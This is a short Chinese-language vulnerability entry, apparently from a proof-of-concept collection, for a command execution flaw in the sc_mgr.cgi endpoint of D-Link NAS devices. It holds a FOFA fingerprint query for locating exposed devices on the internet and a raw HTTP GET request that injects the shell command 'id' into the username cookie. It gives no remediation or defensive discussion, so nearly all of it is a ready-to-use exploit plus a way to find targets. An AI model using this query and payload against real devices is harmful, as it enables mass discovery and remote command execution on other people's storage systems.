# D-Link-NAS接口sc_mgr.cgi存在命令执行漏洞
D-Link-NAS接口sc_mgr.cgi存在命令执行漏洞

## fofa
```java
body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731336110353-da817235-136a-49bd-9e02-241d826321d4.png)

## poc
```java
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
```

![image-20241122152945481](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221529540.png)

